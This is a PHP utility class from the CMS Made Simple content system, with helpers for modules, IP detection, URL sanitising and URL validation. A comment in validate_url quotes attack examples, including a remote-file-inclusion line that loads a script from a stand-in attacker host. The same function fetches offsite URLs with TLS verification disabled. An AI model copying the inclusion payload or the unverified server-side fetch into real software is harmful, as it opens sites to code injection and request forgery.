<?php
#BEGIN_LICENSE
#-------------------------------------------------------------------------
# Class: cms_utils
# (c) 2010 CMS Made Simple Foundation Inc <foundation@cmsmadesimple.org>
#-------------------------------------------------------------------------
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, read the license online at
# https://www.gnu.org/licenses/#LicenseURLs
#-------------------------------------------------------------------------
#END_LICENSE

use CMSMS\Database\Connection;
use CMSMS\FileType;
use CMSMS\FileTypeHelper;

/**
 * A convenience class for CMS Made Simple.
 *
 * The methods in this class provide simple wrappers over other class methods.
 *
 * @package CMS
 * @license GPL
 */

/**
 * A class of static methods providing various convenience utilities.
 *
 * @package CMS
 * @license GPL
 * @author Robert Campbell
 * @since 1.9
 */
final class cms_utils
{
	/**
	 * @ignore
	 */
	private static $_vars;

	/**
	 * @ignore
	 */
	private function __construct() {}

	/**
	 * Get data that was cached for the duration of the current request.
	 *
	 * @since 1.9
	 * @param string $key The wanted-data identifier.
	 * @return mixed The stored data, or null
	 */
	public static function get_app_data($key)
	{
		return (is_array(self::$_vars) && array_key_exists($key,self::$_vars)) ?
			self::$_vars[$key] : null;
	}

	/**
	 * Cache data for use in the current request.
	 *
	 * This method is typically used to store data for later use by another
     * part of the application.
	 * That data only exists for the remainder of the current request.
	 *
	 * @since 1.9
	 * @param string $key The name of this data.
	 * @param mixed  $value The data to store.
	 */
	public static function set_app_data($key,$value)
	{
		if( $key == '' ) return;
		if( !is_array(self::$_vars) ) self::$_vars = array();
		self::$_vars[$key] = $value;
	}

	/**
	 * A convenience function to return the object representing an installed module.
	 *
	 * If a version string is supplied, an object will only be returned if the
	 * installed version is greater than or equal to that supplied version.
	 *
	 * @see version_compare()
	 * @see ModuleOperations::get_module_instance
	 * @since 1.9
	 * @param string $name The module name
	 * @param string $version Optional version indentifier
	 * @return CmsModule The matching module object or null
	 */
	public static function get_module($name,$version = '')
	{
		return ModuleOperations::get_instance()->get_module_instance($name,$version);
	}

	/**
	 * A convenience function to return an indication if a module is available.
	 *
	 * @see also get_module()
	 * @final
	 * @author Robert Campbell
	 * @since 1.11
	 * @param string $name The module name
	 * @return bool
	 */
	final public static function module_available($name)
	{
		return ModuleOperations::get_instance()->IsModuleActive($name);
	}

	/**
	 * A convenience function to return the current database-connection.
	 *
	 * @link http://phplens.com/lens/adodb/docs-adodb.htm
	 * @since 1.9
	 * @return Connection
	 * @throws Exception
	 */
	final public static function get_db()
	{
		return CmsApp::get_instance()->GetDb();
	}

	/**
	 * A convenience function to return the global CMSMS config.
	 *
	 * @see also CmsApp::GetDb()
	 * @since 1.9
	 * @final
	 * @return cms_config The global configuration object.
	 */
	final public static function get_config()
	{
		return cms_config::get_instance();
	}

	/**
	 * A convenience function to return the CMSMS Smarty object.
	 *
	 * @see also CmsApp::GetSmarty()
	 * @since 1.9
	 * @final
	 * @return Smarty_CMS Handle to the Smarty object
	 */
	final public static function get_smarty()
	{
		return Smarty_CMS::get_instance();
	}

	/**
	 * A convenience function to return the current content object.
	 *
	 * This function will always return NULL if called from an admin action
	 *
	 * @since 1.9
	 * @final
	 * @return Content The current content object, or null
	 */
	final public static function get_current_content()
	{
		return CmsApp::get_instance()->get_content_object();
	}

	/**
	 * A convenience function to return the alias of the current page.
	 *
	 * This function will return an empty string if called from an admin action.
	 *
	 * @since 1.9
	 * @final
	 * @return string
	 */
	final public static function get_current_alias()
	{
		$obj = CmsApp::get_instance()->get_content_object();
		if( $obj ) return $obj->Alias();
		return '';
	}

	/**
	 * A convenience function to return the page id of the current page
	 *
	 * This function will return 0 if called from an admin action
	 *
	 * @since 1.9
	 * @final
	 * @return int
	 */
	final public static function get_current_pageid()
	{
		return CmsApp::get_instance()->get_content_id();
	}

	/**
	 * Get the currently selected WYSIWYG module.
	 *
	 * This method will return the currently selected frontend wysiwyg for frontend requests (or null if none is selected)
	 * For admin requests this method will return the user's currently selected wysiwyg module, or null.
	 *
	 * @since 1.10
	 * @param string $module_name The module name.
	 * @return CMSModule
	 */
	public static function get_wysiwyg_module($module_name = '')
	{
		return ModuleOperations::get_instance()->GetWYSIWYGModule($module_name);
	}

	/**
	 * Get the currently selected syntax highlighter module.
	 *
	 * @since 1.10
	 * @author Robert Campbell
	 * @return CMSModule
	 */
	public static function get_syntax_highlighter_module()
	{
		return ModuleOperations::get_instance()->GetSyntaxHighlighter();
	}

	/**
	 * Get the currently selected search module.
	 *
	 * @since 1.10
	 * @author Robert Campbell
	 * @return CMSModule
	 */
	public static function get_search_module()
	{
		return ModuleOperations::get_instance()->GetSearchModule();
	}

	/**
	 * Get the currently selected filepicker module.
	 *
	 * @since 2.2
	 * @author Robert Campbell
	 * @return CMSModule
	 */
	public static function get_filepicker_module()
	{
		return ModuleOperations::get_instance()->GetFilePickerModule();
	}

	/**
	 * Attempt to retrieve the IP address of the connected user.
	 * This function attempts to compensate for proxy servers.
	 *
	 * @author Robert Campbell
	 * @since 1.10
	 * @return string IP address in dotted notation, or empty
	 */
	public static function get_real_ip()
	{
		$ip = (!empty($_SERVER['REMOTE_ADDR'])) ? $_SERVER['REMOTE_ADDR'] : '';
		if (!($ip || empty($_SERVER['HTTP_CLIENT_IP']))) { $ip = $_SERVER['HTTP_CLIENT_IP']; }
		if (!($ip || empty($_SERVER['HTTP_X_FORWARDED_FOR']))) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; }
		return (filter_var($ip,FILTER_VALIDATE_IP)) ? $ip : '';
	}

	/**
	 * Get the current admintheme object
	 *
	 * @author Robert Campbell
	 * @since 1.11
	 * @return CmsAdminThemeBase derived object, or null
	 */
	public static function get_theme_object()
	{
		return CmsAdminThemeBase::GetThemeObject();
	}

	/**
	 * Convert the supplied string into something appropriate for an url-path
	 * for page or News item etc, or a page-alias (with $withslash = false).
	 * Mimics PHP's FILTER_SANITIZE_URL, but also allows relevant valid UTF-8
	 * and relevant extended-ASCII chars. Some chars ('-','_') are repetition-limited.
	 * @since 2.2.22F2
	 *
	 * @param string $str
	 * @param bool $withslash Whether slashes are allowed in $str. Default true.
	 * @return string
	 */
	public static function cleanUrlPath($str,$withslash = true)
	{
		// see also: bookmarks' url sanitisation
		if( !$str ) { return (string)$str; }
		$val = preg_replace([
		 '/[^\x20-\x7e\pL\p{Nd}\p{Po}\x82-\x84\x88\x8a\x8c\x8e\x91-\x94\x96-\x98\x9a\x9c\x9e\x9f\xa8\xad\xb4\xb7\xb8\xc0-\xf6\xf8-\xff]/u',
		 '/\s+/',
		 '/_{3,}/',
		 '/\-{3,}/',
		 '/\\+/',
		 '~/{2,}~'
		 ],[
		 '',
		 ' ',
		 '__',
		 '--',
		 '/',
		 '/'
		 ], (string)$str);
		// escape 'non-verbatim' url-chars (preserving '%' and '/')
		$val = preg_replace_callback('/[^\w\-.~%\/\x80-\xff]/', function($matches) {
			return rawurlencode($matches[0]);
		}, $val);
		// don't double-escape '%'
		$val = preg_replace_callback('/%(?![0-9a-fA-F]{2})/', function($matches) {
			return rawurlencode($matches[0]);
		}, $val);
		if ($withslash) {
			return ltrim($val, '/'); //trailing '/' acceptable
		}
		return strtr($val, ['/' => '']);
	}

	/**
	 * Report whether the specified url is acceptable
	 * @since 2.2.22F2
	 *
	 * @param string $url trim()'d, absolute or '[ROOT_URL]'-prefixed
	 *  or (risky!) '//'-prefixed or site-root-relative or data
	 * @param string $type Optional item-type(s) known to FileTypeHelper
	 *  e.g. 'image'. May be comma-separated series of such types.
	 *  Any type(s) may be negated with a '!' prefix.
	 *  Used only if $url refers to this site.
	 * @return true or error message (i.e. never false)
	 */
	public static function validate_url($url,$type = '')
	{
		if ($url) {
			if (startswith($url,CMS_ROOT_URL)) {
				$local = true;
			} elseif ($url[0] == '/' && $url[1] != '/') {
				$url = CMS_ROOT_URL . $url;
				$local = true;
			} elseif (strpos($url,'/') === false) { // just a basename, presumably site-baseurl-relative
				$url = CMS_ROOT_URL . '/'. $url; // this will suffice for validation
								//unless $type checking is done and the file N/A
				$local = true;
			} elseif (startswith($url,'[ROOT_URL]')) {
				$url = str_replace('[ROOT_URL]',CMS_ROOT_URL,$url);
				$local = true;
			} else {
				$local = false;
			}

			// parsing a data url like "data:" [ mediatype ] [ ";base64" ] "," data
			// finds just $scheme='data' and 'path'=everything after ':' and $host=null
			// parsing a protocol-relative url like '//....'
			// finds no 'scheme' property and explicit $scheme=null

			$host = parse_url($url,PHP_URL_HOST);
			if ($host) {
				$blockhosts = []; // blacklisted hosts? e.g. a site-preference
				if ($blockhosts && in_array(strtolower($host),array_map('strtolower',$blockhosts))) { // caseless check
					return 'The URL host is prohibited';//TODO langify
				}
			}
			if (startswith($url,'//')) {
				$prel = true; // protocol-relative flag
				$local = ($host == parse_url(CMS_ROOT_URL,PHP_URL_HOST));
			} else {
				$prel = false;
			}

			$scheme = parse_url($url,PHP_URL_SCHEME);
			if ($scheme) {
				$val = strtolower($scheme);
				if (!in_array($val,['https','http'])) {
					if (!$local) {
						// lots of valid schemes https://en.wikipedia.org/wiki/List_of_URI_schemes
						// TODO also exclude ws[s]? prob'ly no websocket interaction for CMSMS
						//  also exclude 'data' or allow that for image-url ?
						if (in_array($val, [
						'attachment',
						'blob',
						'chrome',
						'cid',
						'dns',
						'example',
						'file',
						'filesystem',
						'ftp',
						'query',
						'sftp',
						'tel',
						'tftp',
						'view-source',
						])) {
							return 'The URL scheme is not appropriate';//TODO langify 'urlschemenotvalid'
						}
					}
					// typo checks for these common ones
					$pc = 0.0;
					foreach (['https','http'] as $s) {
						similar_text($val,$s,$pc);
						if ($pc > 60 && $pc < 100) {
							$url = str_replace($scheme,$s,$url); // correct scheme
							$scheme = $s;
							break;
						}
					}
				}
			} elseif (!$prel) {
				return 'The URL has no scheme';//TODO langify 'urlschemenone'
			}
			if (!($scheme == 'data' || $host)) { //for a data url, $host = null
				return 'The URL has no host'; //TODO langify 'urlhostnotvalid'
			}
			//TODO other sanity checks, malevolence checks
			//e.g. refer to https://owasp.org/www-community/attacks/Forced_browsing
			//www.example.com/function.jsp?fwd=admin.jsp
			//www.example.com/example.php?url=http://malicious.example.com
			//www.example.com/?go=http%3A%2F%2Fwww.attacker.com%2Fmalscript.txt%3Fq%3D
			//<?php include("http://www.attacker.com/malscript.txt?q=.php");
			// deal with
			// malicious payload as part of the URL, executed immediately when the URL is accessed c.f. sanitize funcs e.g. news_ops::execSpecialize(), UserGuideUtils::cleanContent()
			$url = html_entity_decode($url);
			$url = urldecode($url);
			// malicious payload in data, executed when the data is retrieved and rendered on the page
			//c.f. self::cleanurlpath()
			if ($scheme != 'data') {
				$p = strpos($url,$host) + strlen($host);
				$u2 = substr($url,$p);
				// check for tag(s) TODO check for other bad payloads
				if (preg_match('/<[^>]*>/',$u2)) {
					return lang('illegalcharacters',lang('url'));
				}
				// 2-stage escape (to prevent double-escaping '%')
				$u3 = preg_replace_callback('~[^\w:/?#\]\'[@!$&()*+;=%]~',function($matches) {
					return rawurlencode($matches[0]);
				},$u2);
				$u4 = preg_replace_callback('/%(?![0-9a-fA-F]{2})/',function($matches) {
					return rawurlencode($matches[0]);
				},$u3);
				$url2 = substr($url,0,$p).$u4;
				$helper = new FileTypeHelper();
				$t = '!'.FileType::TYPE_EXECUTABLE;
				if ($type && strpos($type, $t) !== false) {
					// prohibit executable ('.php' etc) BUT .php is probably valid
					foreach ($helper->get_file_type_extensions(FileType::TYPE_EXECUTABLE) as $ext) {
						if ($ext != 'php') {
							$l = strlen($ext);
							if (substr_compare($u4,$ext,-$l,$l,true) == 0) {
								return lang('illegalcharacters',lang('url'));
							}
						}
					}
				}
				if ($local) {
					if (!filter_var($url2,FILTER_VALIDATE_URL)) { // no 'extended-chars' support cuz local url maps to filesystem
						return lang('illegalcharacters',lang('url'));
					}
					$parts = parse_url($url2);
					if (!$parts) {
						return 'The URL is malformed'; //TODO lang('invalidurl') if frontend request?
					}
					if ($type) {
						// validate file extension, using part of original url
						$p = strrpos($u2,'/');
						$fn = substr($u2,$p+1);
						$p = ($fn) ? strrpos($fn,'.') : -1;
						$ext = ($p > 0) ? substr($fn,$p+1): '';
						if (!$ext) {
							return lang('typenotvalid');
						} else {
							$ext = strtolower($ext);
							$allchecks = array_map('trim',explode(',',$type));
							foreach ($allchecks as $onetype) {
								$neg = ($onetype[0] == '!');
								if ($neg) { $onetype = substr($onetype,1); }
								$helperexts = $helper->get_file_type_extensions($onetype);
								if ($neg) {
									if ($helperexts && in_array($ext,$helperexts)) {
										return lang('typenotvalid');
									}
								} elseif (!$helperexts || !in_array($ext,$helperexts)) {
									return lang('typenotvalid');
								}
							}
						}
					}
					// confirm access
					// ignore any post-path url-parts
					$l = 0;
					foreach (array_intersect_key($parts,['scheme'=>1,'host'=>1,'path'=>1]) as $pp => $pv) {
						if (isset($parts[$pp])) {
							$p = strpos($url,$pv);
							$l = max($l, $p + strlen($pv));
						}
					}
					if ($l > 0) {
						$url = substr($url, 0, $l);
					}
					if (!$prel) {
						$fp = str_replace([CMS_ROOT_URL,'/'],[CMS_ROOT_PATH,DIRECTORY_SEPARATOR],$url);
					} else {
						preg_match("/^.*?{$host}(.*)$/",CMS_ROOT_URL,$matches);
						$fp = str_replace(["//{$host}{$matches[1]}",'/'],[CMS_ROOT_PATH,DIRECTORY_SEPARATOR],$url);
					}
					if (!is_readable($fp)) {
						return lang('CMSEX_F001');
					}
				} else {
					// not a local url
					// mimic FILTER_VALIDATE_URL, but allowing relevant valid UTF-8 and extended-ASCII chars TODO extended only if non-local
					if (preg_match('/[^\x20-\x7e\pL\p{Nd}\p{Po}\x82-\x84\x88\x8a\x8c\x8e\x91-\x94\x96-\x98\x9a\x9c\x9e\x9f\xa8\xad\xb4\xb7\xb8\xc0-\xf6\xf8-\xff]/u',$url)) {
						return lang('illegalcharacters',lang('url'));
					}
					// offsite-url check
					if( function_exists('curl_version') && cms_http_request::is_curl_suitable() ) {
						$ch = curl_init($url2);
						curl_setopt_array($ch, [
							CURLOPT_AUTOREFERER => true,
							CURLOPT_CONNECTTIMEOUT => 5,
							CURLOPT_ENCODING => '',
							CURLOPT_FAILONERROR => true,
							CURLOPT_FOLLOWLOCATION => true,
//							CURLOPT_MAXREDIRS => 1,
							CURLOPT_NOBODY => true,
							CURLOPT_HEADER => false,
							CURLOPT_RETURNTRANSFER => false, // was true
							CURLOPT_TIMEOUT => 3,
							CURLOPT_USERAGENT => $_SERVER['HTTP_USER_AGENT'] . ' CMSMS:'.CMS_VERSION, // Let webmaster know who's probing
						]);
						if( $scheme == 'https' ) {
							curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
							curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
						}
						// Get the HTML or whatever is linked in $url
						$response = curl_exec($ch);
//						$lasturl = curl_getinfo($ch,CURLINFO_EFFECTIVE_URL); // try to get the last url
//						$info = curl_getinfo($ch); //DEBUG
						$code = curl_getinfo($ch,CURLINFO_HTTP_CODE); // get http status from last url
						$error = curl_error($ch); // get error message if any
						if( PHP_VERSION_ID < 80500 ) { curl_close($ch); }
						switch ($code) {
							case 200:
							case 203:
							case 226:
							case 301:
							case 302:
							case 304:
							case 307:
							case 308:
								return true;
							default:
								if( !$error ) {
									$error = cms_http_request::http_message($code);
								}
								return lang('notreachable_url') . ' ' . $error;
						}
					}
					else {
						$req = new cms_http_request(['method' => 'HEAD','timeout' => 3]);
						$response = $req->send($url2);
						if ($response != 'OK') {
							$status = $req->getStatus();
							$error = cms_http_request::http_message($status);
							return lang('notreachable_url') . ' ' . $error;
						}
					}
				}
				//TODO data-payload content check ?
			} elseif (!preg_match(
				'/^data:([a-z]+\/[a-z0-9-+.]+(;[a-z0-9-.!#$%*+.{}|~`]+=[a-z0-9-.!#$%*+.{}()_|~`]+)*)?(;base64)?,([a-z0-9!$&\',()*+;=\-._~:@\/?%\s<>]*?)$/i',
				$url)) {
				// data url validation regex adapted from github.com/killmenot/valid-data-url/blob/master/index.js
				return lang('illegalcharacters',lang('url'));
			}
			return true; // the url is valid
		} // url

		return lang('informationmissing').': url';
	}

	/**
	 * Poll the database content-tables for pages having any property,
	 * or specified property(ies), whose value matches a wanted value
	 * @since 2.2.22F2
	 *
	 * @param mixed $needle what to search for
	 * @param mixed $field content-table(s) property name(s) array | string,
	 *  single name or comma-separated series. Default '' hence all properties.
	 * @param bool $strict whether to precisely match $needle. Default false.
	 *  If false, value types need not be the same, and string-values
	 *  need not have the same case, and need not be the entire content
	 *  of a field i.e. *$needle* will match
	 *
	 * @return array, having member(s) each like: page-numeric-id=>row, or empty.
	 *  Each such row will be an array of matches like field1=>val1[,field2=>val2....]
	 */
	public static function find_content($needle, $field = '', $strict = false)
	{
		if (!class_exists('Search_content',false)) {
			self::get_module('Search'); // so that Search-autoloading will work
		}
		return Search_content::Find($needle,$field,$strict);
	}
} // class
